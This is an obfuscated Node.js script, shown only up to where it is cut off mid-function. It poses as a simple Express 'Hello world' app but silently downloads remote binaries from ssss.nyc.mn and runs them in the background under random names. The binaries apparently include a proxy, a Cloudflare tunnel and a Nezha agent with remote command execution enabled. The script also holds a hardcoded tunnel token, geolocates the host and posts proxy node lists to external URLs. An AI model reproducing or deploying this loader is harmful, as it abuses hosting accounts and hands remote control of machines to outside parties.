const _0x44c7a7=_0xab85;(function(_0x2aec1f,_0x184b78){const _0x3eb0fc={_0x791141:0x7e,_0x53b8d0:0x10f,_0x251a92:0xb9,_0x1115b7:0x7a,_0x1f083c:0xfa},_0xfd25bf=_0xab85,_0x938a4a=_0x2aec1f();while(!![]){try{const _0x2d8b52=-parseInt(_0xfd25bf(0xf7))/0x1+-parseInt(_0xfd25bf(_0x3eb0fc._0x791141))/0x2*(-parseInt(_0xfd25bf(0xb2))/0x3)+-parseInt(_0xfd25bf(0xbd))/0x4*(-parseInt(_0xfd25bf(0xa4))/0x5)+parseInt(_0xfd25bf(_0x3eb0fc._0x53b8d0))/0x6+-parseInt(_0xfd25bf(0x11c))/0x7+parseInt(_0xfd25bf(_0x3eb0fc._0x251a92))/0x8*(-parseInt(_0xfd25bf(_0x3eb0fc._0x1115b7))/0x9)+parseInt(_0xfd25bf(_0x3eb0fc._0x1f083c))/0xa;if(_0x2d8b52===_0x184b78)break;else _0x938a4a['push'](_0x938a4a['shift']());}catch(_0x1d9cd3){_0x938a4a['push'](_0x938a4a['shift']());}}}(_0x59de,0x9884e));const express=require(_0x44c7a7(0x126)),app=express(),axios=require(_0x44c7a7(0xda)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x44c7a7(0x6e))[_0x44c7a7(0xab)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x44c7a7(0xde)][_0x44c7a7(0x10b)]||'',PROJECT_URL=process['env'][_0x44c7a7(0xd8)]||'',AUTO_ACCESS=process[_0x44c7a7(0xde)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x44c7a7(0xde)]['FILE_PATH']||'./tmp',SUB_PATH=process['env']['SUB_PATH']||_0x44c7a7(0xdc),PORT=process[_0x44c7a7(0xde)][_0x44c7a7(0x128)]||process[_0x44c7a7(0xde)][_0x44c7a7(0x100)]||0xbb8,UUID=process['env']['UUID']||_0x44c7a7(0x9f),NEZHA_SERVER=process[_0x44c7a7(0xde)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x44c7a7(0xde)][_0x44c7a7(0xbb)]||'',NEZHA_KEY=process[_0x44c7a7(0xde)][_0x44c7a7(0x103)]||'',ARGO_DOMAIN=process[_0x44c7a7(0xde)][_0x44c7a7(0xc5)]||'cf.veve.de5.net',ARGO_AUTH=process['env'][_0x44c7a7(0xa5)]||_0x44c7a7(0xa0),ARGO_PORT=process[_0x44c7a7(0xde)][_0x44c7a7(0x72)]||0x1f41,CFIP=process[_0x44c7a7(0xde)]['CFIP']||'cdns.doon.eu.org',CFPORT=process['env'][_0x44c7a7(0x113)]||0x1bb,NAME=process[_0x44c7a7(0xde)][_0x44c7a7(0xae)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x44c7a7(0xc8)](FILE_PATH),console[_0x44c7a7(0xe0)](FILE_PATH+'\x20is\x20created')):console[_0x44c7a7(0xe0)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x27f260={_0x2b857a:0xc6,_0x39445a:0xca},_0x5bab47=_0x44c7a7,_0x2cd271=_0x5bab47(0xc9);let _0x3977ab='';for(let _0x5b1569=0x0;_0x5b1569<0x6;_0x5b1569++){_0x3977ab+=_0x2cd271[_0x5bab47(0x99)](Math[_0x5bab47(_0x27f260._0x2b857a)](Math[_0x5bab47(_0x27f260._0x39445a)]()*_0x2cd271[_0x5bab47(0x87)]));}return _0x3977ab;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x44c7a7(0xf2)](FILE_PATH,npmName),phpPath=path[_0x44c7a7(0xf2)](FILE_PATH,phpName),webPath=path[_0x44c7a7(0xf2)](FILE_PATH,webName),botPath=path[_0x44c7a7(0xf2)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x44c7a7(0xfe)),listPath=path[_0x44c7a7(0xf2)](FILE_PATH,_0x44c7a7(0xee)),bootLogPath=path[_0x44c7a7(0xf2)](FILE_PATH,_0x44c7a7(0x11e)),configPath=path[_0x44c7a7(0xf2)](FILE_PATH,'config.json');function deleteNodes(){const _0x948d83={_0x58bb62:0xc2,_0x5c8ff1:0xd1,_0x3af325:0xe1,_0x416842:0x80},_0x5c2304=_0x44c7a7;try{if(!UPLOAD_URL)return;if(!fs[_0x5c2304(_0x948d83._0x58bb62)](subPath))return;let _0x83549e;try{_0x83549e=fs[_0x5c2304(_0x948d83._0x5c8ff1)](subPath,'utf-8');}catch{return null;}const _0x53a5f6=Buffer['from'](_0x83549e,_0x5c2304(_0x948d83._0x3af325))[_0x5c2304(_0x948d83._0x416842)](_0x5c2304(0x11d)),_0x14070e=_0x53a5f6[_0x5c2304(0xce)]('\x0a')['filter'](_0x32e55a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5c2304(0x93)](_0x32e55a));if(_0x14070e[_0x5c2304(0x87)]===0x0)return;return axios[_0x5c2304(0x123)](UPLOAD_URL+_0x5c2304(0x91),JSON[_0x5c2304(0xd0)]({'nodes':_0x14070e}),{'headers':{'Content-Type':_0x5c2304(0xc7)}})['catch'](_0x521485=>{return null;}),null;}catch(_0x4d53bf){return null;}}function cleanupOldFiles(){const _0x163766={_0x276568:0x112},_0xd7eff6=_0x44c7a7;try{const _0x39420d=fs[_0xd7eff6(0x111)](FILE_PATH);_0x39420d[_0xd7eff6(_0x163766._0x276568)](_0x160ab0=>{const _0x3d966b=_0xd7eff6,_0x15b448=path['join'](FILE_PATH,_0x160ab0);try{const _0x18ec13=fs[_0x3d966b(0x71)](_0x15b448);_0x18ec13[_0x3d966b(0x114)]()&&fs['unlinkSync'](_0x15b448);}catch(_0x28bd45){}});}catch(_0x448257){}}app['get']('/',function(_0x270eae,_0xf3582d){const _0x44f42e={_0x24c1f6:0xed},_0x36f62f=_0x44c7a7;_0xf3582d[_0x36f62f(0x88)](_0x36f62f(_0x44f42e._0x24c1f6));});async function generateConfig(){const _0x48cc94={_0x5581cf:0x125,_0x443502:0x109,_0x20947a:0xef,_0x47f24c:0xaf,_0x1a2ead:0x85,_0x31ad9d:0x77,_0x1770f2:0xa8,_0x1b609a:0x76,_0x215d8d:0xd6,_0xe83d05:0x76,_0x31effa:0x105,_0x5c6773:0xf2,_0x342b2d:0xf4},_0x185b25=_0x44c7a7,_0x150f27={'log':{'access':_0x185b25(_0x48cc94._0x5581cf),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x185b25(0x121)}],'decryption':_0x185b25(_0x48cc94._0x443502),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x185b25(_0x48cc94._0x20947a),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x185b25(_0x48cc94._0x47f24c),'protocol':_0x185b25(_0x48cc94._0x1a2ead),'settings':{'clients':[{'id':UUID}],'decryption':_0x185b25(_0x48cc94._0x443502)},'streamSettings':{'network':_0x185b25(_0x48cc94._0x31ad9d),'security':_0x185b25(0x109)}},{'port':0xbba,'listen':_0x185b25(0xaf),'protocol':_0x185b25(_0x48cc94._0x1a2ead),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x185b25(0x109)},'streamSettings':{'network':'ws','security':_0x185b25(_0x48cc94._0x443502),'wsSettings':{'path':_0x185b25(_0x48cc94._0x1770f2)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x185b25(_0x48cc94._0x1b609a),_0x185b25(0x81)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x185b25(0xb0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x185b25(_0x48cc94._0x215d8d)}},'sniffing':{'enabled':!![],'destOverride':[_0x185b25(0x117),'tls',_0x185b25(0x81)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x185b25(0xaf),'protocol':_0x185b25(0x94),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x185b25(0x109),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x185b25(_0x48cc94._0xe83d05),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x185b25(0xba)]},'outbounds':[{'protocol':_0x185b25(0xe6),'tag':_0x185b25(_0x48cc94._0x31effa)},{'protocol':'blackhole','tag':_0x185b25(0x95)}]};fs[_0x185b25(0x79)](path[_0x185b25(_0x48cc94._0x5c6773)](FILE_PATH,_0x185b25(_0x48cc94._0x342b2d)),JSON['stringify'](_0x150f27,null,0x2));}function getSystemArchitecture(){const _0x54a2f2=_0x44c7a7,_0x56147e=os['arch']();return _0x56147e===_0x54a2f2(0x84)||_0x56147e==='arm64'||_0x56147e==='aarch64'?_0x54a2f2(0x84):_0x54a2f2(0x106);}function downloadFile(_0x312670,_0x300a45,_0x203b33){const _0x45202e={_0x10144a:0xc2,_0x44d8cb:0x119},_0x578658={_0x1f5170:0x74,_0x43014d:0xbf},_0x457a28=_0x44c7a7,_0x2d8089=_0x312670;!fs[_0x457a28(_0x45202e._0x10144a)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x28987b=fs[_0x457a28(0x7f)](_0x2d8089);axios({'method':_0x457a28(0x9c),'url':_0x300a45,'responseType':'stream'})['then'](_0x334db8=>{const _0xd86ce1={_0x873441:0x74,_0x335cc8:0x98,_0x34d0d4:0xd3},_0x30b74e={_0x21b021:0xe0,_0x1a98d0:0xbc},_0x13421b=_0x457a28;_0x334db8['data'][_0x13421b(0x7b)](_0x28987b),_0x28987b['on']('finish',()=>{const _0x23bb5f=_0x13421b;_0x28987b['close'](),console[_0x23bb5f(_0x30b74e._0x21b021)](_0x23bb5f(0x8a)+path[_0x23bb5f(0x74)](_0x2d8089)+_0x23bb5f(_0x30b74e._0x1a98d0)),_0x203b33(null,_0x2d8089);}),_0x28987b['on']('error',_0x5e65ff=>{const _0x3b1138=_0x13421b;fs['unlink'](_0x2d8089,()=>{});const _0x1b564a=_0x3b1138(0x8a)+path[_0x3b1138(_0xd86ce1._0x873441)](_0x2d8089)+_0x3b1138(_0xd86ce1._0x335cc8)+_0x5e65ff[_0x3b1138(_0xd86ce1._0x34d0d4)];console[_0x3b1138(0xbf)](_0x1b564a),_0x203b33(_0x1b564a);});})[_0x457a28(_0x45202e._0x44d8cb)](_0x280737=>{const _0x3049ce=_0x457a28,_0x1a4672=_0x3049ce(0x8a)+path[_0x3049ce(_0x578658._0x1f5170)](_0x2d8089)+'\x20failed:\x20'+_0x280737[_0x3049ce(0xd3)];console[_0x3049ce(_0x578658._0x43014d)](_0x1a4672),_0x203b33(_0x1a4672);});}async function downloadFilesAndRun(){const _0x2742d0={_0x5b1c77:0x87,_0x1776dd:0xe0,_0x209153:0x86,_0x2cf3e0:0xe2,_0x4c45f9:0xdf,_0x35480a:0xb4,_0x563e13:0x11b,_0x25dac8:0x120,_0x5eba83:0x7d,_0x2525cb:0xc3,_0x1a82bb:0xf9,_0x17f206:0x79,_0x29d3ed:0xf2,_0x55762e:0xac,_0x59df24:0xc1,_0x95904b:0xa1,_0x514056:0x104,_0x5e2347:0x82,_0x1532f1:0x101,_0x4d5cf1:0x7c,_0x1cc49a:0xc0,_0x5831c4:0xc2,_0x3795c3:0x78,_0x3db043:0x8c,_0x220b4c:0x73,_0x314188:0x6f,_0x1f200d:0xff,_0x45706d:0xbf},_0x1a5e80=_0x44c7a7,_0x365820=getSystemArchitecture(),_0x445997=getFilesForArchitecture(_0x365820);if(_0x445997[_0x1a5e80(_0x2742d0._0x5b1c77)]===0x0){console[_0x1a5e80(_0x2742d0._0x1776dd)](_0x1a5e80(0xe3));return;}const _0x5ca737=_0x445997[_0x1a5e80(_0x2742d0._0x209153)](_0x6896ec=>{return new Promise((_0x3b135c,_0x11f39a)=>{const _0x18e180=_0xab85;downloadFile(_0x6896ec['fileName'],_0x6896ec[_0x18e180(0xfc)],(_0x3f673a,_0x2b209d)=>{_0x3f673a?_0x11f39a(_0x3f673a):_0x3b135c(_0x2b209d);});});});try{await Promise[_0x1a5e80(_0x2742d0._0x2cf3e0)](_0x5ca737);}catch(_0x53e802){console['error'](_0x1a5e80(0xe8),_0x53e802);return;}function _0x396a03(_0x58ab65){const _0x2763a0={_0x4e33f2:0xf0,_0x3e2e09:0xe0,_0x8bbdc6:0x124},_0x28efb8=_0x1a5e80,_0xfc0cbe=0x1fd;_0x58ab65[_0x28efb8(0x112)](_0xe85ab2=>{const _0x21086e=_0x28efb8;fs[_0x21086e(0xc2)](_0xe85ab2)&&fs[_0x21086e(0x11a)](_0xe85ab2,_0xfc0cbe,_0x1a28f0=>{const _0x3cab5f=_0x21086e;_0x1a28f0?console[_0x3cab5f(0xbf)](_0x3cab5f(_0x2763a0._0x4e33f2)+_0xe85ab2+':\x20'+_0x1a28f0):console[_0x3cab5f(_0x2763a0._0x3e2e09)](_0x3cab5f(_0x2763a0._0x8bbdc6)+_0xe85ab2+':\x20'+_0xfc0cbe[_0x3cab5f(0x80)](0x8));});});}const _0x5e19f6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x396a03(_0x5e19f6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2e2e94=NEZHA_SERVER[_0x1a5e80(0x101)](':')?NEZHA_SERVER['split'](':')[_0x1a5e80(_0x2742d0._0x4c45f9)]():'',_0x305ab5=new Set([_0x1a5e80(0x104),_0x1a5e80(0x82),_0x1a5e80(_0x2742d0._0x35480a),_0x1a5e80(_0x2742d0._0x563e13),_0x1a5e80(_0x2742d0._0x25dac8),_0x1a5e80(0x83)]),_0x54d899=_0x305ab5[_0x1a5e80(0x11f)](_0x2e2e94)?_0x1a5e80(0x96):_0x1a5e80(_0x2742d0._0x5eba83),_0x1328e5=_0x1a5e80(_0x2742d0._0x2525cb)+NEZHA_KEY+_0x1a5e80(0x9b)+NEZHA_SERVER+_0x1a5e80(0x10e)+_0x54d899+_0x1a5e80(_0x2742d0._0x1a82bb)+UUID;fs[_0x1a5e80(_0x2742d0._0x17f206)](path[_0x1a5e80(_0x2742d0._0x29d3ed)](FILE_PATH,_0x1a5e80(_0x2742d0._0x55762e)),_0x1328e5);const _0x1ab913=_0x1a5e80(_0x2742d0._0x59df24)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x1a5e80(0x8b);try{await exec(_0x1ab913),console[_0x1a5e80(0xe0)](phpName+_0x1a5e80(_0x2742d0._0x95904b)),await new Promise(_0x11e3be=>setTimeout(_0x11e3be,0x3e8));}catch(_0x1b4a2e){console['error'](_0x1a5e80(0x9a)+_0x1b4a2e);}}else{let _0xedb5da='';const _0x1ad80a=[_0x1a5e80(_0x2742d0._0x514056),_0x1a5e80(_0x2742d0._0x5e2347),'2096','2087',_0x1a5e80(0x120),'2053'];_0x1ad80a[_0x1a5e80(_0x2742d0._0x1532f1)](NEZHA_PORT)&&(_0xedb5da=_0x1a5e80(_0x2742d0._0x4d5cf1));const _0x2aebdf='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xedb5da+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2aebdf),console[_0x1a5e80(_0x2742d0._0x1776dd)](npmName+_0x1a5e80(_0x2742d0._0x95904b)),await new Promise(_0x583d54=>setTimeout(_0x583d54,0x3e8));}catch(_0x2a7914){console[_0x1a5e80(0xbf)]('npm\x20running\x20error:\x20'+_0x2a7914);}}}else console[_0x1a5e80(_0x2742d0._0x1776dd)](_0x1a5e80(0xb8));const _0x540b23='nohup\x20'+webPath+_0x1a5e80(_0x2742d0._0x1cc49a)+FILE_PATH+_0x1a5e80(0x8d);try{await exec(_0x540b23),console[_0x1a5e80(_0x2742d0._0x1776dd)](webName+'\x20is\x20running'),await new Promise(_0x1b4f1f=>setTimeout(_0x1b4f1f,0x3e8));}catch(_0x516f5d){console['error'](_0x1a5e80(0x12a)+_0x516f5d);}if(fs[_0x1a5e80(_0x2742d0._0x5831c4)](botPath)){let _0x2f4647;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2f4647='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1a5e80(_0x2742d0._0x3795c3)](/TunnelSecret/)?_0x2f4647=_0x1a5e80(0x8f)+FILE_PATH+_0x1a5e80(_0x2742d0._0x3db043):_0x2f4647=_0x1a5e80(_0x2742d0._0x220b4c)+FILE_PATH+_0x1a5e80(_0x2742d0._0x314188)+ARGO_PORT;try{await exec(_0x1a5e80(_0x2742d0._0x59df24)+botPath+'\x20'+_0x2f4647+_0x1a5e80(_0x2742d0._0x1f200d)),console['log'](botName+_0x1a5e80(0xa1)),await new Promise(_0x44db2e=>setTimeout(_0x44db2e,0x7d0));}catch(_0x580cb8){console[_0x1a5e80(_0x2742d0._0x45706d)]('Error\x20executing\x20command:\x20'+_0x580cb8);}}await new Promise(_0x1e6a06=>setTimeout(_0x1e6a06,0x1388));}function _0x59de(){const _0x25e943=['/dev/null','express','\x0a\x20\x20credentials-file:\x20','SERVER_PORT','\x0avless://','web\x20running\x20error:\x20','ARGO_DOMAIN:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','http://ip-api.com/json/','child_process','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/api/add-subscriptions','statSync','ARGO_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','basename','tunnel.json','tls','tcp','match','writeFileSync','10704465OszHdy','pipe','--tls','false','824ofLiEn','createWriteStream','toString','quic','8443','2053','arm','vless','map','length','send','https://ipapi.co/json/','Download\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/tunnel.yml\x20run','/config.json\x20>/dev/null\x202>&1\x20&','from','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','filter','/api/delete-nodes','https://amd64.ssss.nyc.mn/bot','test','trojan','block','true','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20failed:\x20','charAt','php\x20running\x20error:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','get','taskkill\x20/f\x20/im\x20','automatic\x20access\x20task\x20added\x20successfully','045940b4-649d-495b-86ab-80afb94a03a7','eyJhIjoiYjdjMjY4ZWUzOWFhZTMxNjllNGRlZDIzMjFmNDBlZTIiLCJ0IjoiMWIzMjIxYWItYzg3My00MDM5LTlkN2MtMTJlMzFiZmNjZmFmIiwicyI6Ik1tVmxNR1ZqT0RBdFltRTFOUzAwT0RRMUxXRTBaR1F0WWpjMU5URXhaRFZtWTJGbSJ9','\x20is\x20running','Error\x20executing\x20command:\x20','\x22\x20>\x20/dev/null\x202>&1','420PgYfwg','ARGO_AUTH','firefox','clear','/vless-argo','tunnel.yml','platform','exec','config.yaml','data','NAME','127.0.0.1','vmess','?security=tls&sni=','8937mmCDrb','text/plain;\x20charset=utf-8','2096','App\x20is\x20running','Skipping\x20adding\x20automatic\x20access\x20task','win32','NEZHA\x20variable\x20is\x20empty,skip\x20running','8gDKabR','https+local://8.8.8.8/dns-query','NEZHA_PORT','\x20successfully','9156aivmsk','http\x20server\x20is\x20running\x20on\x20port:','error','\x20-c\x20','nohup\x20','existsSync','\x0aclient_secret:\x20','\x0a\x20\x20tunnel:\x20','ARGO_DOMAIN','floor','application/json','mkdirSync','abcdefghijklmnopqrstuvwxyz','random','push','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/sub.txt\x20saved\x20successfully','split','\x20>/dev/null\x202>&1','stringify','readFileSync','success','message','Add\x20automatic\x20access\x20task\x20faild:\x20','?encryption=none&security=tls&sni=','/vmess-argo','Error\x20reading\x20boot.log:','PROJECT_URL','\x20>\x20nul\x202>&1','axios','&fp=firefox&type=ws&host=','sub','https://amd64.ssss.nyc.mn/v1','env','pop','log','base64','all','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x0atrojan://','unshift','freedom','country_code','Error\x20downloading\x20files:','pkill\x20-f\x20\x22[','\x0a\x20\x20\x20\x20','https://amd64.ssss.nyc.mn/agent','countryCode','Hello\x20world!','list.txt','/trojan-argo','Empowerment\x20failed\x20for\x20','https://arm64.ssss.nyc.mn/v1','join','https://arm64.ssss.nyc.mn/agent','config.json','\x0a\x0avmess://','.exe\x20>\x20nul\x202>&1','700015TTwTFA','https://arm64.ssss.nyc.mn/web','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','18716310kPdXZY','substring','fileUrl','listen','sub.txt','\x20>/dev/null\x202>&1\x20&','PORT','includes','https://oooo.serv00.net/add-url','NEZHA_KEY','443','direct','amd','response','status','none','Nodes\x20uploaded\x20successfully','UPLOAD_URL','Unknown','TunnelSecret','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2143992XrbEBs','ArgoDomain:','readdirSync','forEach','CFPORT','isFile','Error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/bot','http','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','catch','chmod','2087','7941283UwlqkN','utf-8','boot.log','has','2083','xtls-rprx-vision','org','post','Empowerment\x20success\x20for\x20'];_0x59de=function(){return _0x25e943;};return _0x59de();}function getFilesForArchitecture(_0x4b715e){const _0x246925={_0x4ee0e9:0xf8,_0x2773e2:0x116,_0x39de00:0x92,_0x61a7f3:0xe5,_0x1f35bf:0x84,_0x50892e:0xf1,_0x449b3e:0xdd},_0x9c5556=_0x44c7a7;let _0x54b0eb;_0x4b715e==='arm'?_0x54b0eb=[{'fileName':webPath,'fileUrl':_0x9c5556(_0x246925._0x4ee0e9)},{'fileName':botPath,'fileUrl':_0x9c5556(_0x246925._0x2773e2)}]:_0x54b0eb=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x9c5556(_0x246925._0x39de00)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x14e641=_0x4b715e===_0x9c5556(0x84)?_0x9c5556(0xf3):_0x9c5556(0xeb);_0x54b0eb[_0x9c5556(_0x246925._0x61a7f3)]({'fileName':npmPath,'fileUrl':_0x14e641});}else{const _0x510d9e=_0x4b715e===_0x9c5556(_0x246925._0x1f35bf)?_0x9c5556(_0x246925._0x50892e):_0x9c5556(_0x246925._0x449b3e);_0x54b0eb[_0x9c5556(0xe5)]({'fileName':phpPath,'fileUrl':_0x510d9e});}}return _0x54b0eb;}function argoType(){const _0xfd4031={_0x4c87e8:0x97,_0x3971c8:0x10d,_0x3f9deb:0x79,_0x527994:0xce,_0x1237c9:0x127,_0x458c19:0x75,_0x50c708:0x118,_0x5d1235:0x6c,_0x5639e7:0xa9},_0x58cb2a=_0x44c7a7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x58cb2a(0xe0)](_0x58cb2a(_0xfd4031._0x4c87e8));return;}if(ARGO_AUTH[_0x58cb2a(0x101)](_0x58cb2a(_0xfd4031._0x3971c8))){fs[_0x58cb2a(_0xfd4031._0x3f9deb)](path[_0x58cb2a(0xf2)](FILE_PATH,_0x58cb2a(0x75)),ARGO_AUTH);const _0x5d1c7a=_0x58cb2a(0xc4)+ARGO_AUTH[_0x58cb2a(_0xfd4031._0x527994)]('\x22')[0xb]+_0x58cb2a(_0xfd4031._0x1237c9)+path[_0x58cb2a(0xf2)](FILE_PATH,_0x58cb2a(_0xfd4031._0x458c19))+_0x58cb2a(_0xfd4031._0x50c708)+ARGO_DOMAIN+_0x58cb2a(_0xfd4031._0x5d1235)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x58cb2a(0x79)](path[_0x58cb2a(0xf2)](FILE_PATH,_0x58cb2a(_0xfd4031._0x5639e7)),_0x5d1c7a);}else console[_0x58cb2a(0xe0)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3b7aa6={_0x11af52:0x11d,_0x57a65d:0xce,_0xbdb0f3:0x87,_0x24e680:0x110,_0x84bd2:0x11e,_0x5c6ba4:0xc1,_0x216f70:0xff,_0x29c79f:0xe0,_0x3087d8:0xa1,_0x5de4da:0xbf,_0xb24dc9:0xa2,_0x4592ee:0xd7},_0x40946d={_0x26777f:0x9c,_0x27aa3d:0x89,_0x4a968e:0x122,_0x55b6f6:0x6d,_0x454cca:0xad,_0x24d285:0xd2,_0x3b16a0:0xec,_0x16c979:0xad,_0x1e8abd:0x10c},_0x9b9560={_0x3744a2:0xaa,_0x26c200:0xe9,_0x23f635:0x99},_0x474c8f={_0x32399f:0xcb},_0x2f685d=_0x44c7a7;let _0x5b7f28;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5b7f28=ARGO_DOMAIN,console[_0x2f685d(0xe0)](_0x2f685d(0x12b),_0x5b7f28),await _0xda390(_0x5b7f28);else try{const _0x20b28d=fs[_0x2f685d(0xd1)](path['join'](FILE_PATH,_0x2f685d(0x11e)),_0x2f685d(_0x3b7aa6._0x11af52)),_0x42977b=_0x20b28d[_0x2f685d(_0x3b7aa6._0x57a65d)]('\x0a'),_0x3287bf=[];_0x42977b[_0x2f685d(0x112)](_0x1ca8da=>{const _0x530a68=_0x2f685d,_0x2e4bfb=_0x1ca8da['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2e4bfb){const _0x1eb70c=_0x2e4bfb[0x1];_0x3287bf[_0x530a68(_0x474c8f._0x32399f)](_0x1eb70c);}});if(_0x3287bf[_0x2f685d(_0x3b7aa6._0xbdb0f3)]>0x0)_0x5b7f28=_0x3287bf[0x0],console[_0x2f685d(0xe0)](_0x2f685d(_0x3b7aa6._0x24e680),_0x5b7f28),await _0xda390(_0x5b7f28);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0x2f685d(_0x3b7aa6._0x84bd2)));async function _0x4d170d(){const _0x471246=_0x2f685d;try{process[_0x471246(_0x9b9560._0x3744a2)]==='win32'?await exec(_0x471246(0x9d)+botName+_0x471246(0xf6)):await exec(_0x471246(_0x9b9560._0x26c200)+botName[_0x471246(_0x9b9560._0x23f635)](0x0)+']'+botName[_0x471246(0xfb)](0x1)+_0x471246(0xa3));}catch(_0x33bf4){}}_0x4d170d(),await new Promise(_0x2c2057=>setTimeout(_0x2c2057,0xbb8));const _0x41431a=_0x2f685d(0x73)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2f685d(_0x3b7aa6._0x5c6ba4)+botPath+'\x20'+_0x41431a+_0x2f685d(_0x3b7aa6._0x216f70)),console[_0x2f685d(_0x3b7aa6._0x29c79f)](botName+_0x2f685d(_0x3b7aa6._0x3087d8)),await new Promise(_0x77c7f9=>setTimeout(_0x77c7f9,0xbb8)),await extractDomains();}catch(_0x4493ff){console[_0x2f685d(_0x3b7aa6._0x5de4da)](_0x2f685d(_0x3b7aa6._0xb24dc9)+_0x4493ff);}}}catch(_0x3b3c02){console['error'](_0x2f685d(_0x3b7aa6._0x4592ee),_0x3b3c02);}async function _0x15f20a(){const _0x496ab5=_0x2f685d;try{const _0x3ff314=await axios[_0x496ab5(_0x40946d._0x26777f)](_0x496ab5(_0x40946d._0x27aa3d),{'timeout':0xbb8});if(_0x3ff314['data']&&_0x3ff314['data'][_0x496ab5(0xe7)]&&_0x3ff314['data'][_0x496ab5(_0x40946d._0x4a968e)])return _0x3ff314[_0x496ab5(0xad)][_0x496ab5(0xe7)]+'_'+_0x3ff314[_0x496ab5(0xad)][_0x496ab5(0x122)];}catch(_0x1d6566){try{const _0x340e30=await axios[_0x496ab5(_0x40946d._0x26777f)](_0x496ab5(_0x40946d._0x55b6f6),{'timeout':0xbb8});if(_0x340e30[_0x496ab5(_0x40946d._0x454cca)]&&_0x340e30['data'][_0x496ab5(0x108)]===_0x496ab5(_0x40946d._0x24d285)&&_0x340e30[_0x496ab5(_0x40946d._0x454cca)][_0x496ab5(_0x40946d._0x3b16a0)]&&_0x340e30[_0x496ab5(0xad)][_0x496ab5(0x122)])return _0x340e30[_0x496ab5(_0x40946d._0x16c979)][_0x496ab5(0xec)]+'_'+_0x340e30[_0x496ab5(0xad)][_0x496ab5(0x122)];}catch(_0xbfc691){}}return _0x496ab5(_0x40946d._0x1e8abd);}async function _0xda390(_0x3b5ddc){const _0x21a547={_0xb34747:0x109,_0x1cbd32:0xf5,_0x3d5da5:0xb1,_0x390f35:0xe0,_0x1ad8a7:0xe0},_0x136aed=await _0x15f20a(),_0x8063c6=NAME?NAME+'-'+_0x136aed:_0x136aed;return new 